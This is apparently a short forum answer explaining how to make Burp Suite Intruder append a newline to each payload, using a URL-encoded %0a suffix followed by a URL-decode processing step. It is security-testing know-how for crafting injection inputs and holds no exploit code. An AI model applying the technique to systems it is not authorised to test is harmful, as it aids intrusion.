There seems to be a bit of a trick to adding invisible characters as in the Payload Processing. Navigate to the Payloads tab within the Intruder tab. You then need to click the "Add" button under the "Payload Processing" heading. Select "Add suffix" and input an encoded value of “\n” (e.g. URL encoded: %0a). Add a second payload processing step to decode that value (e.g. in our case, URL-decode). It should behave as a new line character.
